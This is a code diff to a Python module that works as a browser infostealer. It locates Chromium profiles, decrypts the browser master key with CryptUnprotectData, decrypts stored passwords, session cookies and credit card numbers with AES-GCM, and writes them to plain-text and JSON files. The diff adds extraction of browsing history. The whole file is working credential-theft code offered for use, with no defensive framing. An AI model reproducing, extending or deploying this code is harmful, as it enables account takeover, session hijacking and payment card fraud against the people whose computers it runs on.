@@ -3,6 +3,7 @@ from shutil import copyfile
 from base64 import b64decode
 from json import loads, dump
 from re import compile, findall
+from datetime import datetime, timedelta
 from os import path, makedirs, remove, listdir
 
 from Crypto.Cipher import AES
@@ -20,7 +21,7 @@ class Chromium:
         for index, variable in enumerate(self.config.Variables):
             self.__dict__.update({variable: args[index]})
 
-    def _get_profiles(self):
+    def __get_profiles(self):
 
         if self.browser_path[-9:] in ["User Data"]:
 
@@ -29,49 +30,54 @@ class Chromium:
 
         return [self.browser_path]
 
-    def _check_paths(self):
+    def __check_paths(self):
 
         if path.exists(self.browser_path) and any(self.statuses):
 
-            makedirs(rf"{self.storage_path}\{self.storage_folder}\Browsers\{self.browser_name}")
-            self.profiles = self._get_profiles()
+            makedirs(rf"{self.storage_path}\Browsers\{self.browser_name}")
+            self.profiles = self.__get_profiles()
 
-    def _get_key(self):
+    def __get_key(self):
 
         with open(self.state_path, "r", encoding="utf-8") as state:
             return CryptUnprotectData(b64decode(loads(state.read())["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
 
-    def _decrypt(self, buff, master_key):
+    def __get_datetime(self, date):
+
+        try:
+            return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
+        except:
+            return "Can't decode"
+
+    def __decrypt(self, buff, master_key):
 
         try:
             return AES.new(master_key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
         except:
             return "Can't decode"
 
-    def _write_passwords(self, profile, cursor, master_key):
+    def __write_passwords(self, *args):
 
-        with open(rf"{self.storage_path}\{self.storage_folder}\Browsers\{self.browser_name}\{profile} Passwords.txt", "a", encoding="utf-8") as passwords:
-            for result in cursor.execute(self.config.PasswordsSQL).fetchall():
+        with open(rf"{self.storage_path}\Browsers\{self.browser_name}\{args[0]} Passwords.txt", "a", encoding="utf-8") as passwords:
+            for result in args[1].execute(self.config.PasswordsSQL).fetchall():
 
-                password = self._decrypt(result[2], master_key)
-
-                if any(filter(lambda item: item != "", [result[0], result[1], password])):
-                    passwords.write(f"URL: {result[0]}\nUsername: {result[1]}\nPassword: {password}\n\n")
+                password = self.__decrypt(result[2], args[2])
+                passwords.write(f"URL: {result[0]}\nUsername: {result[1]}\nPassword: {password}\n\n")
 
         passwords.close()
 
-    def _write_cookies(self, profile, cursor, master_key):
+    def __write_cookies(self, *args):
 
         results = []
 
-        for result in cursor.execute(self.config.CookiesSQL).fetchall():
+        for result in args[1].execute(self.config.CookiesSQL).fetchall():
             results.append({
                 "creation_utc": result[0],
                 "top_frame_site_key": result[1],
                 "host_key": result[2],
                 "name": result[3],
                 "value": result[4],
-                "encrypted_value": self._decrypt(result[5], master_key),
+                "encrypted_value": self.__decrypt(result[5], args[2]),
                 "path": result[6],
                 "expires_utc": result[7],
                 "is_secure": result[8],
@@ -86,23 +92,39 @@ class Chromium:
                 "is_same_party": result[17],
             })
 
-        with open(rf"{self.storage_path}\{self.storage_folder}\Browsers\{self.browser_name}\{profile} Cookies.json", "a", encoding="utf-8") as cookies:
-
+        with open(rf"{self.storage_path}\Browsers\{self.browser_name}\{args[0]} Cookies.json", "a", encoding="utf-8") as cookies:
             dump(results, cookies)
 
         cookies.close()
 
-    def _write_cards(self, profile, cursor, master_key):
+    def __write_cards(self, *args):
 
-        with open(rf"{self.storage_path}\{self.storage_folder}\Browsers\{self.browser_name}\{profile} Cards.txt", "a", encoding="utf-8") as cards:
-            for result in cursor.execute(self.config.CardsSQL).fetchall():
+        with open(rf"{self.storage_path}\Browsers\{self.browser_name}\{args[0]} Cards.txt", "a", encoding="utf-8") as cards:
+            for result in args[1].execute(self.config.CardsSQL).fetchall():
 
-                number = self._decrypt(result[3], master_key)
-
-                if any(filter(lambda item: item != "", [result[0], result[1], result[2], number])):
-                    cards.write(f"Username: {result[0]}\nNumber: {number}\nExpire Month: {result[1]}\nExpire Year: {result[2]}\n\n")
+                number = self.__decrypt(result[3], args[2])
+                cards.write(f"Username: {result[0]}\nNumber: {number}\nExpire Month: {result[1]}\nExpire Year: {result[2]}\n\n")
 
         cards.close()
+
+    def __write_history(self, *args):
+
+        with open(rf"{self.storage_path}\Browsers\{self.browser_name}\{args[0]} History.txt", "a", encoding="utf-8") as history:
+
+            temp = []
+
+            for result in args[1].execute(self.config.HistorySQL).fetchall():
+
+                data = args[1].execute(self.config.HistoryLinksSQL % result[0]).fetchone()
+                result = f"URL: {data[0]}\nTitle: {data[1]}\nLast Visit: {self.__get_datetime(data[2])}\n\n"
+
+                if result in temp:
+                    continue
+
+                temp.append(result)
+                history.write(result)
+
+        history.close()
 
     def __get_browser_paths(self, profile):
         return (
@@ -111,7 +133,7 @@ class Chromium:
                 "name": "Passwords",
                 "path": rf"{profile}\Login Data",
                 "alt_path": None,
-                "method": self._write_passwords,
+                "method": self.__write_passwords,
                 "error": "No passwords found"
             },
             {
@@ -119,7 +141,7 @@ class Chromium:
                 "name": "Cookies",
                 "path": rf"{profile}\Cookies",
                 "alt_path": rf"{profile}\Network\Cookies",
-                "method": self._write_cookies,
+                "method": self.__write_cookies,
                 "error": "No cookies found"
             },
             {
@@ -127,12 +149,20 @@ class Chromium:
                 "name": "Cards",
                 "path": rf"{profile}\Web Data",
                 "alt_path": None,
-                "method": self._write_cards,
+                "method": self.__write_cards,
                 "error": "No cards found"
+            },
+            {
+                "status": self.statuses[3],
+                "name": "History",
+                "path": rf"{profile}\History",
+                "alt_path": None,
+                "method": self.__write_history,
+                "error": "No history found"
             }
         )
 
-    def _check_functions(self):
+    def __check_functions(self):
 
         for profile in self.profiles:
 
@@ -159,7 +189,7 @@ class Chromium:
 
                         with connect(db) as connection:
                             connection.text_factory = lambda text: text.decode(errors="ignore")
-                            item["method"](profile.replace("\\", "/").split("/")[-1], connection.cursor(), self._get_key())
+                            item["method"](profile.replace("\\", "/").split("/")[-1], connection.cursor(), self.__get_key())
                             connection.cursor().close()
 
                         connection.close()
@@ -172,8 +202,8 @@ class Chromium:
 
         try:
 
-            self._check_paths()
-            self._check_functions()
+            self.__check_paths()
+            self.__check_functions()
 
         except Exception as e:
             if self.errors is True: print(f"[{self.browser_name.upper()}]: {repr(e)}")
